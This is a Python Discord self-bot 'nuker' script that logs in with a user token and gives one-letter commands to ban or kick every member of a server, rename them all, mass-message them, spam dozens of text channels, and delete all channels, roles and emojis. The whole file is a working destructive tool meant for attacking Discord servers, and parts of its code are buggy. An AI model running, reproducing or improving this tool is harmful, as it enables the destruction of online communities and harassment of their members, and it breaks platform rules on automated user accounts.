token = ""
prefix = "$"


import discord
import itertools
import threading
import time
import sys
import requests
import uuid
import string
import random
from discord.ext import commands


done = False

done = True
bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("-------------------------------------------------------------")
    print ("Made by Lucifers Angel")
    print ("Prefex -", prefix)
    print ("User -", bot.user.name)
    print ("ID - ", bot.user.id)
    print ("-------------------------------------------------------------")
    print ("A - Kick All.")
    print ("B - Bans All.")
    print ("C - Renames All.")
    print ("D - Message All.")
    print ("E - Deletes All.")
    print ("F - Creates Text Channels.")
    print ("G - Test Command.")
    print ("H - Status Changer.")
    print ("-------------------------------------------------------------")
    
try:
    async def self_check(ctx):
        if bot.user.id == ctx.message.author.id:
            return True
        else:
            return False

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def F (ctx, rename_to):
        print ("Main.py")
        await ctx.message.delete()
        guild = ctx.message.guild
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        await guild.create_text_channel(rename_to)
        clear()
        print ("LOG  : Action Completed: F")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def G (ctx):
        await ctx.message.delete()
        print ("LOG : Payload Ran: G")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def A (ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("LOG : Action Completed: A")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def B (ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("LOG : Action Completed: B")
        
    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def C (ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: C")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def D (ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: D")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def E (ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (E, "{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: E channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (E, "{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{role.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (E, "{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (E, "{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (E, "{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (E, "{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (E, "{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: E")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def E (ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (E, "{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (E, "{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (E, "{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (E, "channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (E,"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (E, "{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (E, "{user.name} has been banned from {ctx.guild.name}")
            except:
                print (E, "{user.name} has FAILED to be banned from {ctx.guild.name}")
                print ("Action Completed: E")
                
        @commands.check(self_check)
        @bot.command(pass_context=True)
        async def test (ctx):
            await ctx.message.delete()

except:
    pass

bot.run(token, bot=False)
